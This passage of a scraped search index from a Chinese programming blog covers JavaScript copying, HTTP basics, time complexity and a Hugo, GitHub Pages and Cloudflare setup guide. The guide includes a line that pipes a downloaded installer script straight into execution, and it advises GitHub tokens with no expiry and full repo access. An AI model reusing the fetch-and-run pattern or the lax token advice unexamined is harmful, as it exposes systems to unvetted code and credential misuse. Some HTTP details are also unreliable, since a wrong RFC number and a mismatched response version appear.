.page-wrap-main { background: url(\u0026#34;~assets/images/main/bg.png\u0026#34;); background-size: cover; width: 100%; position: relative; .webp \u0026amp; { background-image: url(\u0026#34;~assets/images/main/bg.png?type=webp\u0026#34;); } } ","date":"2022-08-10T00:00:00Z","image":"https://live.staticflickr.com/65535/52282467469_7cf86509a9_o.jpg","permalink":"https://wayneblog.ga/2022-08-10/vue-cli-use-webp/","title":"Vue-cli plugin：使用套件將圖片自動轉檔為webp格式"},{"content":" 參考網站\nJavaScript的記憶體空間 在 JavaScript 中，每一個數據都需要一個記憶體空間。記憶體空間分為兩種，棧記憶體（stock） 與 堆記憶體（heap）。 棧是系統自動分配的記憶體空間，由系統自動釋放，堆則是動態分配的記憶體，大小不定不會自動釋放。 基礎資料型別 JavaScript 中的基礎資料型別，這些值都有固定的大小，儲存在 棧記憶體中，由系統自動分配儲存空間，在棧記憶體空間的值，我們可以直接進行操作，因此基礎資料型別都是按照值訪問。 在棧記憶體中的資料發生複製的行為時，系統會自動為新變數開闢一個新的記憶體空間，當複製執行後，兩個記憶體空間的值就互不影響，改變其中一個不會影響另一個 棧記憶體空間資料複製示例 1 2 3 4 5 6 var a = `I am variable a`; var b = a; console.log(b); //`I am variable a` b = `I am variable b`; console.log(a); //`I am variable a` console.log(b); //`I am variable b` 引用資料型別 引用型別的值是儲存在 堆記憶體中的物件，在 JavaScript 中我們不能直接操作物件的堆記憶體空間。因為引用型別的值都是按引用訪問的，所以在操作物件時，實際上是操作物件的引用而不是實際的物件。 引用可以理解為儲存在棧記憶體中的一個地址，該地址指向堆記憶體中的一個實際物件。 引用型別值的複製，系統會為新的變數自動分配一個新的棧記憶體空間 這個棧記憶體空間，儲存著與被複制變量相同的指標，儘管他們在棧記憶體中的記憶體空間的位置互相獨立，但是在堆記憶體中訪問到的物件實際上是同一個，因此當我們改變其中一個物件的值時，實際上就是改變原來的物件。 棧記憶體空間儲存指標（地址），堆記憶體空間儲存實際的物件，我們通過變數訪問物件時，實際上訪問的是物件的引用（地址）。 記憶體中的棧區域存放變數（基本型別的變數包括變數宣告和值）以及指向堆區域儲存位置的指標（引用型別的變數包括變數宣告和指向內容的指標）。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 var a = { name : `I am object a`, type : \u0026#39;object\u0026#39; } var b = a; console.log(b); // {name: \u0026#34;I am object a\u0026#34;, type: \u0026#34;object\u0026#34;} b.name = `I am object b`; console.log(a); // {name: \u0026#34;I am object b\u0026#34;, type: \u0026#34;object\u0026#34;} console.log(b); // {name: \u0026#34;I am object b\u0026#34;, type: \u0026#34;object\u0026#34;} 基本型別總結 基本資料型別： 基本資料型別 包括 null、undefined、number、string、boolean、symbol(es6) 存放位置 記憶體中的棧區域中 比較 值的比較，判斷是否相等，如果值相等，就相等。一般使用 === 進行比較，因為 == 會進行型別的轉換 拷貝 賦值（通過 = 賦值操作符來賦值），兩個變數的值之間相互沒有影響 引用型別總結 包括 陣列、物件、函式 存放位置 記憶體的棧區域中存放變數和指標，堆區域儲存實際的物件 比較 是引用的比較（就是地址的比較，變數在棧記憶體中對應的指標地址相等就指向同一個物件）判斷是否為同一個物件，示例如下 變數a和變數b的引用不同，物件就不是同一個物件 1 2 3 var a = {name:\u0026#39;Jay\u0026#39;}; var b = {name:\u0026#39;Jay\u0026#39;}; a===b //false 我們對JavaScript中引用型別進行操作的時候，都是操作其物件的引用（儲存在棧記憶體中的指標） 賦值、深拷貝和淺拷貝 (Assignment, deep copy and shallow copy) 賦值：兩個變數的都指向同一個物件，改變其中一個，另一個也會受到影響。 所謂拷貝就是複製，通過複製原物件生成一個新的物件。 淺拷貝 重新在堆記憶體中開闢一個空間，拷貝後新物件獲得一個獨立的基本資料型別 資料，和原物件共用一個原物件內的引用型別 資料，改變基本型別 資料，兩個物件互不影響，改變其中一個物件內的引用型別 資料，另一個物件會受到影響。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 var obj = { name: \u0026#39;Jay Chou\u0026#39;, age: 32, song:{ name:\u0026#39;發如雪\u0026#39;, year:2007 } } var obj1 = obj; function shallowCopy(obj){ var scObj = {}; for(var prop in obj){ if(obj.hasOwnProperty(prop)){ scObj[prop] = obj[prop] } } return scObj; } var obj2 = shallowCopy(obj); console.log(obj === obj1,\u0026#39;obj === obj1\u0026#39;,\u0026#39;賦值\u0026#39;); console.log(obj === obj2,\u0026#39;obj === obj2\u0026#39;,\u0026#39;淺拷貝\u0026#39;); // true \u0026#34;obj === obj1\u0026#34; \u0026#34;賦值\u0026#34; // false \u0026#34;obj === obj2\u0026#34; \u0026#34;淺拷貝\u0026#34; console.log(obj.song === obj2.song); //true obj2.song.name=\u0026#39;雙截棍\u0026#39;; obj2.name=\u0026#39;Jay\u0026#39;; console.log(obj) // {name: \u0026#34;Jay Chou\u0026#34;, age: 32, song: {name:\u0026#39;雙截棍\u0026#39;,year:2007}} console.log(obj1); // {name: \u0026#34;Jay Chou\u0026#34;, age: 32, song: {name:\u0026#39;雙截棍\u0026#39;,year:2007}} console.log(obj2); {name: \u0026#34;Jay\u0026#34;, age: 32, song: {name:\u0026#39;雙截棍\u0026#39;,year:2007}} console.log(obj===obj1) //true console.log(obj===obj2) //false 深拷貝 不論是物件內的基本型別還是引用型別 都被完全拷貝,拷貝後兩個物件互不影響。 一種比較簡單實現方法是使用 var dcObj = JSON.parse(JSON.stringify(obj)) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 var obj = { name: \u0026#39;Jay Chou\u0026#39;, age: 32, song:{ name:\u0026#39;發如雪\u0026#39;, year:2007 } } var dcObj=JSON.parse(JSON.stringify(obj)); console.log(dcObj); // {name: \u0026#34;Jay Chou\u0026#34;, age: 32, song: {name:\u0026#39;發如雪\u0026#39;,year:2007}} console.log(dcObj.song === obj.song); //false dcObj.name=\u0026#39;Jay\u0026#39;; dcObj.song.name=\u0026#39;雙截棍\u0026#39;; console.log(obj); // {name: \u0026#34;Jay Chou\u0026#34;, age: 32, song: {name:\u0026#39;發如雪\u0026#39;,year:2007}} console.log(dcObj); //{name: \u0026#34;Jay\u0026#34;, age: 32, song: {name:\u0026#39;雙截棍\u0026#39;,year:2007}} 比較：賦值、深拷貝、淺拷貝： 賦值 新物件仍然指向原物件，改變新物件的基本型別和引用型別的值都會使原物件對應的值一同改變。 淺拷貝 改變新物件基本型別的值不會使原物件對應的值一起改變，但是改變新物件引用型別的值會使原物件對應的值一同改變。 深拷貝 改變新物件基本型別和引用型別的值，都不會影響原物件，兩者互相獨立，互不影響。 ","date":"2022-08-09T00:00:00Z","image":"https://live.staticflickr.com/65535/52277851687_14d13f49a6_o.jpg","permalink":"https://wayneblog.ga/2022-08-09/js-deep-copy-vs-shallow-copy/","title":"JavaScript的記憶體空間、賦值和深淺拷貝"},{"content":" 安裝 hugo homebrew (MacOs) 1 brew install hugo scoop (Windows) 1 2 3 4 5 6 7 8 9 10 11 12 # 若未安裝過 Scoop，需先： # 1. 第一次需先設定，允許遠端腳本 # Set-ExecutionPolicy RemoteSigned -Scope CurrentUser # 2. 下載並安裝 Scoop # irm get.scoop.sh | iex # 透過 Scoop 安裝 Hugo scoop install hugo # or 安裝擴展版本 # scoop install hugo-extended apt-get (Linux) 1 sudo apt-get install hugo 利用 hugo 建立網站 1 2 # 進到本地資料夾根目錄後 hugo new site . --force 下載主題模板 (以 hugo-theme-stack 為例) 1 git submodule add git://github.com/CaiJimmy/hugo-theme-stack/ themes/hugo-theme-stack clone 完畢後，把 exampleSite 文件夾中的 config.yaml 複製到站點目錄下，同時刪除此目錄下的 config.toml 文件。\n將 exampleSite/content/* 複製到站點目錄下的 content/\n剩餘主題的設定與文章內容，可依個人需求自行設定，本篇不再贅述。\ngithub 創建一個 public 的 repo，用於存放發布用的 public 資料夾。 前往 repo 的 Settings -\u0026gt; Pages 設定好欲發布的分支與 root path 設定完畢後，github 會分配給你一個公開的網址：https://{your-account}.github.io/{your-repo-name}/，若不需自定義網址與 CI/CD 流程，到此步驟即可完畢。\n設定自定義網址 註冊一個網址 本文使用 freenom 註冊一組免費的網址 註冊完畢後，前往 Manage Domain 選擇 Management Tools -\u0026gt; NameServers 後，此頁面先暫時放置著，待會再回來繼續設定 前往 Cloudflare 後台 登入 Cloudflare 後台，並選擇 網站 DNS 設定如圖： 將註冊的 domain 設定指向到 github server ip 185.199.108.153 185.199.109.153 185.199.110.153 185.199.111.153 設定 CNAME www 指向到剛剛 github 分配給你的 domain (path不需要)： https://{your-account}.github.io/ 將下方兩個 Cloudflare 名稱伺服器複製下來 選擇 Use custom nameservers (enter below) 將剛剛從 Cloudflare 複製的兩個 NameServer，貼到 NameServer 1、NameServer 2 Cloudflare 後台設定強制使用 SSL 點選 SSL/TLS 的 邊緣憑證 打開 一律使用HTTPS 回到 github pages，將網址填寫至 Custom domain，短暫驗證完畢後，即可點選 Save 送出設定 自定義網址已設定完畢，可使用網址打開網站。\n設定 github actions 做 CI/CD 準備材料1：生成 github personal access tokens 前往 github 的個人設定 \u0026quot;Settings\u0026quot;，下方點選 Developer settings\n點選 Generate new token\n設定備註、過期時間、權限後即可生成 token\n建議過期時間可以設定 No expiration (無過期時間)、權限設定 repo 全部勾選 生成後，token 請複製起來，因為關閉此頁面後，將無法再取得該 token 的明碼。\n準備材料2：登入 Cloudflare 後台，取得 區域識別碼(Zone) 登入 Cloudflare，選擇自己的 domain 點選 概觀，並於圖中標示處取得 區域識別碼(Zone Id) 準備材料3：取得 Global API Key 於 概觀 下方點選 取得您的 API Token 點選 檢視，輸入密碼後取得 Global API Key 準備材料4：生成 API token 點選 建立 Token -\u0026gt; 建立自訂 Token 設定 token 名稱、權限、TTL PS：權限必須至少擁有 區域 -\u0026gt; 快取清除 -\u0026gt; 清除，以便 CI/CD 後使用 token 清除 DNS cache 設定完畢後即可建立 token 建立後，也請將 token 複製起來，因為關閉此頁面後，將無法再取得該 token 的明碼。 材料準備完畢，開始設定 secret 進入 source code 的 repo，點選 Settings -\u0026gt; Secret -\u0026gt; Actions，並將剛剛的四個準備材料設定到 Actions secrets 中 此處 Actions secrets 的名稱如需修改，則待會的 github-actions.yml 內的名稱也需跟著修改，否則會抓不到 secrets 中設定的值哦!\n於 source code repo 根目錄新增 .github/workflows/github-actions.yml github-actions.yml 內容 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 name: Auto build and publish to public site repository # 只有推送到 main 才觸發 on: push: branches: - \u0026#34;main\u0026#34; pull_request: branches: [\u0026#34;main\u0026#34;] jobs: hugo-publish: name: publish content to public site runs-on: ubuntu-latest steps: # 使用當前 source code 的 repo - name: checkout source code repo uses: actions/checkout@v3 with: # 因為目前的 repo 有使用到 submodule(hugo themes)，所以 submodule 也要一併同步，不然原本的 repo 是沒有 submodule 的內容 submodules: true token: ${{ secrets.ACCESS_TOKEN }} # public 網站是放置在另一個 repo 所以這裡也要 clone 一份下來處理 # 因為我 Hugo 預設是產生檔案到 public 資料夾，所以將 public repo clone 到 ./public/ 內，以便後續 publish - name: clone and checkout public repo uses: actions/checkout@v3 with: # 這裡是 public 網站在 github 上的 repo 名稱 repository: {template/template-public-repo-name} path: public # tip: 需事先產生一把 personal access token 放到 repo 的 secrets 裡 # 然後 secrets 裡的名稱就叫 ACCESS_TOKEN # 參考 https://help.github.com/en/actions/automating-your-workflow-with-github-actions/authenticating-with-the-github_token token: ${{ secrets.ACCESS_TOKEN }} # 使用別人做好的 Hugo Actions - name: setup hugo uses: peaceiris/actions-hugo@v2 with: hugo-version: latest extended: true # 用 Hugo 產生檔案 - name: build content to public site working-directory: ./ # --cleanDestinationDir 清除舊檔案 run: hugo --minify --gc --cleanDestinationDir # 將檔案 commit 到 網站 public repo - name: deploy and publish updates working-directory: ./public # user.email 還有 user.name 可以取自己喜歡的，一定要設定不然會出錯 run: | # 當 git 有更動時才進行動作 if [[ `git status --porcelain` ]]; then git config --local user.email \u0026#34;{typing your email}\u0026#34; git config --local user.name \u0026#34;{typing your name}\u0026#34; git add . -A git commit -m \u0026#34;build: auto publish\u0026#34; git push origin else echo \u0026#34;content no changes\u0026#34; fi # 清除 cloudflare dns cache - name: clear cloudflare cache uses: nathanvaughn/actions-cloudflare-purge@master with: # Using Zone Id cf_zone: ${{ secrets.CLOUDFLARE_ZONE }} # Using API Token cf_auth: ${{ secrets.CLOUDFLARE_API_TOKEN }} 內容 {} 內的資訊請更換成自己的資訊\n附上 yaml 範例，詳細 github-actions.yaml 文件請查閱 github 官方文件\n建立檔案後，將 commit push 後，即可於 source code repo 的 Actions 頁面查看 CI/CD 的過程。 ","date":"2022-08-01T00:00:00Z","image":"https://live.staticflickr.com/65535/52274839367_8325e83fea_o.jpg","permalink":"https://wayneblog.ga/2022-08-01/hugo-github-pages-actions-and-cloudflare/","title":"架設部落格之一條龍免費寶典：Hugo 生成靜態網站、Pages 發布網站、設定 custom domain(free 12 months)、Actions 做 CI/CD"},{"content":" 參考網站 - 初學者都該學會的 HTTP 通訊協定基礎\n參考網站 - Http/2 是什麼?\n目前 HTTP 通訊協定的版本 HTTP/0.9 於 1991 年發表(已廢止) HTTP/1.0 於 1996 年 5 月發表(RFC 1945) HTTP/1.1 於 1997 年 1 月發表(RFC 2068) 於 1999 年 6 月發布 HTTP/1.1 更新版(RFC 2616) 於 2014 年 6 月再次更新 HTTP/1.1 並將規格文件拆成六份 HTTP/2(Wikipedia) 於 2015 年 5 月發布(RFC 7540)(瀏覽器相容性) 僅針對 HTTP/1.1 的 Message Syntax 部分作出強化 HTTP/0.9 (已廢止) 概要 於 1990 年由 Tim Berners-Lee 提出最初的 HTTP 建議(WWW)\n實作重點\n用戶端要求是以 ASCII 字元為主(單行命令即可發出請求 GET/) 用戶端要求會以一個 換行字元 (CRLF) 來結束 伺服器回應是以 ASCII 字元為主，回應內容是 HTML 文件 每次執行完 Request / Response 就會自動關閉連線 主要特色\nClient / Server 架構、Request / Response 協定 跑在 TCP/IP 上的 ASCII 協定 (要求/回應) 被設計用來傳輸 HTML 文件 每完成一次 ASCII 協定就會自動關閉連線 使用 bash 測試 1 2 3 4 5 6 7 8 # 建立連線到 google $ telnet google.com 80 \u0026gt; Connected to google.com. \u0026gt; Escape character is \u0026#39;^]\u0026#39;. # 發送 GET 請求 $ GET /about \u0026gt; ... HTTP/1.0 概要 在 1991 到 1995 年之間，所謂 瀏覽器 騰空出世！\n於 1996 年 5 月發表 HTTP/1.0 版 (RFC 1945)\n與 HTTP/0.9 不同的部分\n用戶端要求是以 ASCII 字元為主，但可發送多行命令(含要求標頭) 先送出要求方法，再送出要求標頭，最後以一個額外的換行字元結束 伺服器回應是以 ASCII 字元為主，回應內容會區分為 狀態列 回應標頭 回應內文主體(不僅僅是 HTML 文件，可以是更多內容類型) 每完成一次 Request / Response 交握就會自動關閉 TCP/IP 連線 使用 bash 測試 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # 建立連線到 google $ telnet google.com 80 \u0026gt; Trying 172.217.24.14... \u0026gt; Connected to google.com. \u0026gt; Escape character is \u0026#39;^]\u0026#39;. # 發送 GET 請求 $ GET /about HTTP/1.0 Host: www.google.com # 因一個 domain 可以 hosting 多個網站，因此通常都會於 request header 再標記 Host \u0026gt; HTTP/1.0 301 Moved Permanently \u0026gt; ... # 取得後，會自動中斷 TCP 連線 # 若需再發送請求，需重新建立 TCP 連線 $ telnet google.com 80 ... HTTP/1.1 概要 於 1997 年 1 月發表 HTTP/1.1 版 (RFC 1945)\n於 1999 年 6 月發布 HTTP/1.1 更新版 (RFC 2616)\n與 HTTP/1.0 不同的部分\n傳輸協議的效能改進(新增不少 HTTP 標頭定義) 持續連線狀態(persistent connection) 切塊編碼傳輸(chunked encoding transfer) 位元範圍請求(byte range request) 額外快取機制(cache control) 請求管線作業(request pipelining)(需搭配持續連線狀態特性才能用) 使用 bash 測試 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 # 建立連線到 google $ telnet google.com 80 \u0026gt; Trying 172.217.24.14... \u0026gt; Connected to google.com. \u0026gt; Escape character is \u0026#39;^]\u0026#39;. # 發送 GET 請求 $ GET /about HTTP/1.1 Host: www.google.com # 因一個 domain 可以 hosting 多個網站，因此通常都會於 request header 再標記 Host \u0026gt; HTTP/1.0 301 Moved Permanently \u0026gt; ... # 取得後，不會自動中斷 TCP 連線，可再發送請求 $ GET /abc HTTP/1.1 Host: www.google.com # 因一個 domain 可以 hosting 多個網站，因此通常都會於 request header 再標記 Host \u0026gt; HTTP/1.1 404 Page Not Found \u0026gt; ... 目前 HTTP/1.1 的六大規格 RFC 7230 HTTP/1.1：Message Syntax and Routing RFC 7231 HTTP/1.1：Semantics and Content(最重要) RFC 7232 HTTP/1.1：Conditional Requests RFC 7233 HTTP/1.1：Range Requests RFC 7234 HTTP/1.1：Caching RFC 7235 HTTP/1.1：Authentication 關於 HTTP 通訊協定的基本常識 無狀態特性(stateless)：相同的 request，都會得到相同的 response，不會因為狀態不同而改變 分散式架構(distributed)：相同的 request，不同載體發送，都會得到相同的 response 協作的架構(collaborative)：不一定只有 client / server，也可以是 client / proxy / reverse proxy / server 超文本(hypertext = not just \u0026ldquo;text) but with \u0026ldquo;links\u0026rdquo;)：除了內容，還包含連結 初學者應了解 HTTP 的基本運作方式 如何發出 HTTP 要求(HTTP Request)\n要求方法(Request Methods) GET、POST、PUT、DELETE、PATCH、\u0026hellip; 要求標頭(Request Headers) Connection、COntent-Type、\u0026hellip; 斷行符號(CRLF) 要求內容主體(Request Body) 如何回應 HTTP 訊息(HTTP Response)\n回應狀態碼(Response Status Codes) HTTP/1.1 200 OK 回應標頭(Response Headers) 斷行符號(CRLF) 回應內容主題(Response Body) HTTP/2 HTTP/2 各個瀏覽器的支援度 點我查看瀏覽器支援度\nEdge / Firefox / Chrome / Opera 皆在 2015 年起就支援 HTTP/2，基本上不需要太擔心主流瀏覽器的支援性問題。\nPS：如何在 Node.js 中使用 HTTP/2\nHTTP/2 改善了什麼？ http/2標準發布於2015年5月，其主要目的是透過一些措施改善瀏覽器瀏覽網頁 加載的速度(page load) 。目前大多數的瀏覽器已支援 http/2 (chrome, firefox, safari等)標準，又 http/2與 http/1.1有著高度的相容信，舉凡request method(post, get..etc), http status code, url, header 等等，因此對於web developer來說，只需要確保你的網站有支援https(因為瀏覽器只支援https 在http/2上)。那麼http/1.1與http/2到底相差多快呢，點我體驗!\nHTTP/2 是如何改善？ 只需要單一網路連線 (Single TCP connection) 只需要單一網路連線，就可以連接網站伺服器，下載所有需要的資源。大大節省 HTTP/1.1 需要一直建立多個網路連線時的啟動時間浪費。\nRequest and response multiplexing (多路複用) 在 http/1.1 中，client 端時常會同時發起多個 request 至 server 拿取檔案(像是js, css, image等)，以此方式達到快速載入頁面。如下圖在 http/1.1 中會同時與 server 建立3個 TCP connection，但是瀏覽器通常會限制 TCP connection 同時建立的數目。因此在 http/2 協定中，允許 client 端與同一 server 建立單一 TCP connection 並以非同步方式傳輸要的檔案。\n優先權設計 (Prioritization) 伺服器可以決定例如 CSS 或 JavaScript 檔案，哪些要優先傳送。\nHeader compression (標頭壓縮) 每一個 http 的傳輸中都會攜帶一組 header，在 http/1.1 中，header 會是以明文(plain text)傳輸大小通常會是500-800 bytes，若有攜帶 cookie 也有可能會更大。因此在 http/2 中，會將 request 以及 response 的 header 使用 HPACK 演算法壓縮 header 的內容，此方法壓縮後可以減少 85%-88% 的大小。\nServer push (伺服器推送) 在 http/1.1 中，通常 client 端 request 甚麼 server 就會回傳甚麼，例如: 當 client request html 那麼 server 將只會回傳 html。但在 http/2 中，允許 server 主動推送有相關的資料給 client，例如: 當 client 只 request html，但是 server 知道 client request 此 html 後續也會 request css, js 等，因此 server 就會在 client 沒有 request 的情況下主動推送 css, js 檔給 client。那 server 怎麼知道這些檔案是有相關性的呢? web developer 將需要 server push 的檔案加上特定的描述即可。(描述)\n不過，這個功能比較有爭議，一來他需要 Web 開發者額外描述有哪些檔案需要隨著 HTML 一起推送給瀏覽器，不是 Web 伺服器升級 HTTP/2 就自動會有。二來它不管瀏覽器是不是已經有快取這個資源，都會推送而造成頻寬浪費。因此實務上筆者認為可以改用瀏覽器的 Prefetch 功能，讓客戶端的瀏覽器自己處理即可。\nBinary framing layer (二進制影格層) 在 http/2 中，header 與 body 所挾帶的 property 與 http/1.1 相同(ex. verbs, methods)，然而兩者在傳輸上會有不同。在 http/2 中，會將 header 以及 body 編碼成二進制在 server 與 client 端中傳輸，在 http/1.1 中，則是以明文的方式傳輸。將訊息編碼成二進制進行傳輸，此特性是 http/2 的其他特性的根本基礎。\n冷知識：在 HTTP/1.1 定義了四種解析訊息的方式，在 HTTP/2 只需要一種。\n總結 根據 w3Techs 網站，目前使用http/2的網站有45.7%，未來確實會變成主流，身為軟體工程師，還是多少理解來的好。此篇文章僅記錄筆者蒐集資料彙整結果，若有任何錯誤資訊還請直接點出，萬分感謝。\n","date":"2022-07-24T00:00:00Z","image":"https://live.staticflickr.com/65535/52276290470_787c77a1b5_o.jpg","permalink":"https://wayneblog.ga/2022-07-24/beginner-http-lesson/","title":"初學者都該了解的 HTTP 通訊協定基礎"},{"content":" 參考網站 - 初學者學演算法｜從時間複雜度認識常見演算法\n溫故知新 演算法的簡單定義：輸入 + 演算法 = 輸出 時間複雜度：衡量演算法執行好壞的工具 大 O 符號：用來描述演算法在輸入 n 個東西時，所需時間與 n 的關係 在 n 非常大時，好的演算法設計可以省下非常多時間 演算法的速度不是以秒計算，而是以步驟次數 實務上，我們只會紀錄最高次方的那一項，並忽略其所有的係數 目錄：常見的六種時間複雜度與演算法 O(1)：陣列讀取 O(n)：簡易搜尋 O(log n)：二分搜尋 O(nlogn)：合併排序 O(n²)：選擇排序 O(2^n)：費波那契數列 O(1)：陣列讀取 說明 時間複雜度為 O(1) 的演算法，代表著不管你輸入多少個東西，程式都會在同一個時間跑完。在程式設計中，最簡單的例子就是讀取一個陣列中特定索引值的元素(程式麻瓜先別急著吐血，且讓我們在下面慢慢說明)。\n陣列讀取 陣列是程式中儲存東西的一種容器，我們可以想像成一排已經編號好的櫃子。每一個櫃子上的編號我們稱為「索引值」（Index，在程式中這個編號通常從 0 開始），而櫃子裡的物品我們稱為「元素」。例如：假設神奇寶貝大師小明在一個名叫 Pokemons 的陣列裡依序放入他的神奇寶貝們，我們來複習一下陣列、元素、索引值的關係：\n在程式碼中我們把七隻神奇寶貝這樣表達：\n1 Pokemons = [\u0026#34;卡丘\u0026#34;,\u0026#34;胖丁\u0026#34;,\u0026#34;尼龜\u0026#34;,\u0026#34;比獸\u0026#34;,\u0026#34;呆獸\u0026#34;,\u0026#34;種子\u0026#34;,\u0026#34;小剛\u0026#34;] 這時，假設我們想要知道在這個 Pokemons 陣列中任一個編號所對應到的神奇寶貝，我們都只需要把這個編號對應的元素印出來，就能知道對應的神奇寶貝是誰了。如果我想知道這個陣列中的第 n 號櫃的神奇寶貝是誰（以下假設我們想知道 n= 0），在程式碼中我們可以這樣表達：\n1 2 3 4 n = 0 print(Pokemons[n]) \u0026gt;\u0026gt; \u0026#34;卡丘\u0026#34; 陣列讀取時，因為我們已經知道櫃子的索引值，不管放入的 n 等於多少，程式都可以在 “一個步驟” 就到達 n 所對應到編號的櫃子並取出該元素，像這樣的案例，我們就會說陣列讀取演算法的時間複雜度為 O(1)。\nO(n)：簡易搜尋 說明 時間複雜度為 O(n) 的演算法，代表著執行步驟會跟著輸入 n 等比例的增加。例如當 n = 8，程式就會在 8 個步驟完成。最簡單的例子，就是所謂的簡易搜尋。\n這邊要特別提醒一點，通常程式步驟的時間複雜度會是用程式執行會碰到的最壞狀況 (Worst Case) 來表示，詳細例子我們可以在下面看到。\n簡易搜尋 讓我們沿用上一段的 Pokemons 陣列作為例子。Pokemons 這一排櫃子裡有八隻神奇寶貝，假設每個櫃子的門都被關上，我們事前也不知道各個神奇寶貝的位置，這時如果想要知道「呆獸」神奇寶貝在哪裡時，我們第一個想到的方法會是什麼呢？\n最直觀地想，我們會從第一個櫃子開始試，一次開一個櫃子，直到找到「呆獸」為止。像這樣的搜尋方法，就是最經典簡單的「簡易搜尋」。\n在程式碼中，簡易搜尋的方法可以這樣表達：\n1 2 3 4 5 6 7 Pokemons = [\u0026#34;卡丘\u0026#34;,\u0026#34;胖丁\u0026#34;,\u0026#34;尼龜\u0026#34;,\u0026#34;比獸\u0026#34;,\u0026#34;呆獸\u0026#34;,\u0026#34;種子\u0026#34;,\u0026#34;小剛\u0026#34;] for Pokemon in Pokemons: if Pokemon == \u0026#34;呆獸\u0026#34;: print(\u0026#34;找到呆獸！\u0026#34;) break else: print(\u0026#34;這個櫃子裡不是呆獸\u0026#34;) 觀察上面的程式碼時，我們可以發現，如果呆獸在第 0 號櫃，我們一個步驟就會找到它，但如果他是在第 6 號櫃，我們要花七個步驟才能找到他。\n還記得我們在上面提過的小小提醒嗎？我們通常會用程式執行會碰到的「最壞狀況」來決定複雜度的表示，也因此，當我們要從 n 個櫃子中找到一隻特定的神奇寶貝，我們最慘最慘的情況需要花剛好 n 個步驟才能找到（想像要找的神奇寶貝在最後一個櫃子的情況）。像這樣的案例，我們就會說簡易搜尋演算法的時間複雜度為 O(n)。\nO(log n)：二分搜尋法 說明 時間複雜度為 O(log n) 的演算法（這邊的 log 都是以二為底），代表當輸入的數量是 n 時，執行的步驟數會是 log n。（讓忘記 log 是什麼的同學們複習一下，當 log n = x 的意思是 n = 2^x，如果這部分的腦細胞尚未復活，且讓我們先記住 n = 2^x，再來看看例子）。\n舉例來說，當 n = 4，程式會在 2 個步驟完成（4 = 2²）；n = 16 時，程式會在 4 個步驟完成（16 = 2⁴），以此類推。\n在程式中，O(log n) 的最常見例子是二分搜尋法。\n二分搜尋法 假設我們在一本字典中想要找到一個單字，這個字以 W 開頭，我們可以用前面提過「簡易搜尋」的邏輯，從第一頁的 A 開始找起，一個一個找到天荒地老海枯石爛。也可以用更珍惜生命的方式，直接翻到字典的後面，找到以 W 開頭的第一個字後再開始往後找。\n同樣的邏輯，假設有一長串有小到大排序好的數字們，我要在其中找特定一個數字，我們一樣可以從第一個往後一個一個檢查。但假設我們想要更珍惜生命，聰明的讀者可能已經想到了我們在「終極密碼」這種遊戲中會使用的策略，也就是每次都先檢查最中間的數字，如果中間的數字比我們要找的數字大，我們要找的數量就只剩原本的一半（因為在後段的數字顯然都會比我們要找的數字大），這樣的方法，就稱作二分搜尋法。\n舉一個實際的例子，假設今天有一排編號好的櫃子，裡面擺著八個由小到大排序好的數字。假設我們知道裡面的數字包含 55，但我們不知道在哪一個編號櫃子中。讓我們來比較簡易搜尋（從第一格往後一個一個檢查）跟二分搜尋法有什麼差別。\n從上面的圖可以看到，一般的搜尋方法需要花五個步驟才能找到 55。\n而在二分搜尋法中，我們先打開最中間的櫃子，發現裡面的數字是 41。因為 55 比 41 大，因此我們知道從一號櫃到三號櫃都不會有 55，接下來只需要檢查五號櫃到七號櫃。\n同樣的邏輯，我們打開剩下三個可能性中最中間的櫃子，發現六號櫃裡面的數字是 61，因為 61 比 55 大，我們可以知道七號櫃的數字一定也比 55 大，得知 55 一定就在五號櫃之中。\n接下來，要再次來關心兩個搜尋方法的時間複雜度。簡易搜尋的情況中，我們可以輕鬆地知道最壞的情況就是剛好七個步驟（要找的數字是 80 ）。而二分搜尋法，我們可以先練習去計算各種情況需要的步驟，而最終的答案如下表：\n從上表我們可以發現，二分搜尋法最慘最慘，也只需要三個步驟。\n推廣到有 n 個櫃子時，我們可以發現：二分搜尋法在每進行一個步驟時，就可以排除掉一半的可能性。每次都能減少一半，因此二分搜尋法最糟最糟也只需要以 2 為底的 log n 個步驟就能完成。\n二分搜尋法在程式碼中的例子，對於程式新手可能需要花比較多的理解。如果你是對程式有一定理解的人，可以嘗試動手實做看看。而如果下方的程式碼對於讀者還有些吃力的話，也可以先多多熟悉語法後回來複習即可。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 Numbers = [5,17,33,41,55,61,80] Find = 55 ​ low = 0 high = len(Numbers) - 1 ​ while low \u0026lt;= high: mid = (low + high) // 2 if Numbers[mid] \u0026gt; Find: high = mid - 1 elif Numbers[mid] \u0026lt; Find: low = mid + 1 else: break ​ print(mid) 小結 在這篇文章中，我們分別了解了 O(1)、O(n)、O(logn) 的時間複雜度，以及對應到的三個常見演算法。而在接下來的文章中，我們會開始認識新朋友，在演算法中佔有重要地位的「排序法」，以及在更進階的例子。\n","date":"2022-07-23T00:00:00Z","image":"https://live.staticflickr.com/65535/52276285230_7f886f0bca_o.jpg","permalink":"https://wayneblog.ga/2022-07-23/common-time-complexity/","title":"初學者學演算法｜從時間複雜度認識常見演算法"},{"content":" 剛剛用日常上班前挑衣服的例子和沒學過程式的 00 說明時間複雜度的概念很好理解耶～！\n例子是這樣的\u0026hellip;\n一早要出門的時候，想要從衣櫃中找出紅色的上衣。\n其中一種方式是像左圖一樣，這是掏寶上很熱門的「疊衣服褲子收納神器」，雖然看起來整理的很乾淨，但如果你要從中找到紅色的衣服，你就得要由上而下一件一件找，最糟的情況就是一直翻到最下面才能找到你要的紅色衣服。\n另一種方式是像右圖一樣，把衣服用立起來的方式，一眼就可以看到紅色的衣服在哪，直接拿出來，幾乎不用找。\n左圖的那種方式，時間複雜的就是 O(n)，n 就是衣服的件數，雖然紅色的衣服有可能就放在最上面，一眼就可以看到，但在探討時間複雜度的時候都要考慮最差的情況，所以如果你有 n 